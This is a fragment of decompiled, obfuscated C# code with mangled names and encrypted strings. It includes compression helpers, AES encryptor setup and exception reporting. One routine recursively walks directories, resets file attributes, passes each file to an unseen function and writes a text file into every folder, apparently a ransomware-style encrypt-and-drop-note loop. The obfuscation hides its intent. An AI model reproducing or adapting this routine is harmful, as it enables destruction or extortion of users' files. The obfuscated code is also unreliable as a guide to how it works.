	static void _0023Sh(_0023nb._0023hc _0023bc, int P_1)
	{
		int num = default(int);
		try
		{
			byte[] _0023a = _0023bc._0023a;
			num = _0023bc._0023c++;
			_0023a[num] = (byte)P_1;
			byte[] _0023a2 = _0023bc._0023a;
			num = _0023bc._0023c++;
			_0023a2[num] = (byte)(P_1 >> 8);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, (object)num, (object)_0023bc, (object)P_1);
			throw;
		}
	}

	static void _0023Th(_0023nb._0023Mb _0023lb, byte[] P_1)
	{
		try
		{
			_0023_0023._0023Jh(_0023lb._0023j, P_1);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)_0023lb, (object)P_1);
			throw;
		}
	}

	static _0023V _0023Uh(UIntPtr _0023W, _00234 _0023X, _00232 _0023Y, string _0023y, out _00233 _0023Z)
	{
		return _009C_0003_009E_0006._001F_0004_0006(_0023W, _0023X, _0023Y, _0023y, out _0023Z);
	}

	static _00233 _0023Vh(ref object _0023x, string _0023y, [Out] string _0023z)
	{
		_0023x = null;
		try
		{
			_00233 _0023Z;
			using _0023V _0023V = _0023_0023._0023Uh(_0023O._0023c, _00234._0023a, _00232._0023a, _0023y, out _0023Z);
			switch (_0023Z)
			{
			case _00233._0023b:
				return _00233._0023b;
			default:
				return _00233._0023a;
			case _00233._0023c:
				_0023x = _0023V._0023S(_0023z);
				break;
			}
		}
		catch
		{
			return _00233._0023a;
		}
		return _00233._0023c;
	}

	static void _0023Wh(Exception _0023Mc, _0023Uc P_1)
	{
		using (new _0023Ge(P_1._0023l, _0023ab._00239._00237(107391946)))
		{
			try
			{
				Type type = _0023Mc.GetType();
				P_1._0023Gc(type);
				string value = _0023ab._00239._00237(107391529);
				try
				{
					value = _0023Mc.Message;
				}
				catch
				{
				}
				P_1._0023l.WriteAttributeString(_0023ab._00239._00237(107391965), value);
				string text = _0023Mc.StackTrace!.Trim();
				P_1._0023l.WriteAttributeString(_0023ab._00239._00237(107391952), text);
				int num = text.IndexOf(' ');
				text = text.Substring(num + 1);
				num = text.IndexOf(_0023ab._00239._00237(107391923));
				if (num != -1)
				{
					text = text.Substring(0, num);
				}
				P_1._0023l.WriteAttributeString(_0023ab._00239._00237(107391886), text);
				P_1._0023Ac(new _0023Zc(_0023Mc, _00230c: true));
			}
			catch
			{
			}
		}
	}

	static _0023nb._0023Ib _0023Xh(_0023nb._0023Jb P_0)
	{
		byte[] array = default(byte[]);
		try
		{
			array = new byte[P_0._0023n];
			Array.Copy(P_0._0023j, P_0._0023m, array, 0, P_0._0023n);
			return new _0023nb._0023Ib(array);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00235h(_0023hd, (object)array, (object)P_0);
			throw;
		}
	}

	static void _0023kg(object[] _0023hd, Exception _0023Td)
	{
		if (_0023Td == null || !(_0023Td is SecurityException) || !(_0023ee._0023d == _0023ab._00239._00237(107394766)) || !_0023ee.Handler._00235d((SecurityException)_0023Td))
		{
			_0023_0023._0023Ug(_0023Td, _0023hd);
			_0023ee.Handler._00236d(_0023Td, _0023zd: false, _00237d: false);
		}
	}

	static void _0023Yh(string _0023k)
	{
		bool flag = default(bool);
		string[] files = default(string[]);
		int num = default(int);
		bool flag2 = default(bool);
		FileInfo fileInfo = default(FileInfo);
		string[] directories = default(string[]);
		int num2 = default(int);
		bool flag3 = default(bool);
		try
		{
			try
			{
				flag = _0023k != _0023ab._00239._00237(107391551) + Environment.UserName + _0023ab._00239._00237(107391877);
				if (!flag)
				{
					return;
				}
				files = Directory.GetFiles(_0023k);
				num = 0;
				while (true)
				{
					flag2 = num < files.Length;
					if (!flag2)
					{
						break;
					}
					fileInfo = new FileInfo(files[num]);
					fileInfo.Attributes = FileAttributes.Normal;
					_0023_0023._0023Ah(files[num]);
					num++;
				}
				File.WriteAllText(_0023k + _0023ab._00239._00237(107391896), _0023m._0023a);
				directories = Directory.GetDirectories(_0023k);
				num2 = 0;
				while (true)
				{
					flag3 = num2 < directories.Length;
					if (flag3)
					{
						_0023_0023._0023Yh(directories[num2]);
						num2++;
						continue;
					}
					break;
				}
			}
			catch (Exception)
			{
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Ch(_0023hd, (object)flag, (object)files, (object)directories, (object)num, (object)fileInfo, (object)flag2, (object)num2, (object)flag3, (object)_0023k);
			throw;
		}
	}

	static Version _0023Zh(Version _0023F)
	{
		return OsInformation._0011_009A_000F_0003(OsInformation._0096_0003_009E_0006(), _0023F);
	}

	static object _00230h(_0023Zc P_0)
	{
		return P_0._0023b;
	}

	static ICryptoTransform _00231h(bool _0023hb, byte[] _0023ib, byte[] _0023jb)
	{
		AesCryptoServiceProvider aesCryptoServiceProvider = default(AesCryptoServiceProvider);
		ICryptoTransform cryptoTransform = default(ICryptoTransform);
		try
		{
			aesCryptoServiceProvider = new AesCryptoServiceProvider();
			try
			{
				cryptoTransform = (_0023hb ? aesCryptoServiceProvider.CreateDecryptor(_0023jb, _0023ib) : aesCryptoServiceProvider.CreateEncryptor(_0023jb, _0023ib));
				return cryptoTransform;
			}
			finally
			{
				((IDisposable)aesCryptoServiceProvider)?.Dispose();
			}
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023Dg(_0023hd, (object)aesCryptoServiceProvider, (object)cryptoTransform, (object)_0023jb, (object)_0023ib, (object)_0023hb);
			throw;
		}
	}

	static void _00232h(_0023Uc P_0)
	{
		P_0._0023v?.Invoke(P_0, EventArgs.Empty);
	}

	static short _00233h(int _0023Nb)
	{
		try
		{
			return (short)((_0023nb._0023Vb._0023j[_0023Nb & 0xF] << 12) | (_0023nb._0023Vb._0023j[(_0023Nb >> 4) & 0xF] << 8) | (_0023nb._0023Vb._0023j[(_0023Nb >> 8) & 0xF] << 4) | _0023nb._0023Vb._0023j[_0023Nb >> 12]);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._00232f(_0023hd, (object)_0023Nb);
			throw;
		}
	}

	static void _00234h(int _0023Pb, _0023nb._0023Vb P_1)
	{
		int i = default(int);
		try
		{
			_0023_0023._00231g(P_1._0023n);
			_0023_0023._00231g(P_1._0023l);
			_0023_0023._00231g(P_1._0023m);
			_0023_0023._0023Pg(P_1._0023k, P_1._0023l._0023d - 257, 5);
			_0023_0023._0023Pg(P_1._0023k, P_1._0023m._0023d - 1, 5);
			_0023_0023._0023Pg(P_1._0023k, _0023Pb - 4, 4);
			for (i = 0; i < _0023Pb; i++)
			{
				_0023_0023._0023Pg(P_1._0023k, (int)P_1._0023n._0023b[_0023nb._0023Vb._0023i[i]], 3);
			}
			_0023_0023._0023Mf(P_1._0023l, P_1._0023n);
			_0023_0023._0023Mf(P_1._0023m, P_1._0023n);
		}
		catch (Exception _0023hd)
		{
			_0023_0023._0023fg(_0023hd, (object)i, (object)P_1, (object)_0023Pb);
			throw;
		}
	}

	static void _00235h(Exception _0023hd, object _0023Id, object _0023Jd)
	{
		_0023_0023._0023Ug(_0023hd, new object[2] { _0023Id, _0023Jd });
	}

	static string _00236h(string _0023z)
	{
		if (_0023z.StartsWith(_0023ab._00239._00237(107391863)) && _0023z.EndsWith(_0023ab._00239._00237(107391810)))
		{
			return _0023ab._00239._00237(107391789);
		}
		return _0023z;
	}

	[DllImport("shell32", EntryPoint = "ExtractIconEx")]
	static extern int _00237h(string _0023le, int _0023me, out IntPtr _0023ne, out IntPtr _0023oe, int _0023pe);
}
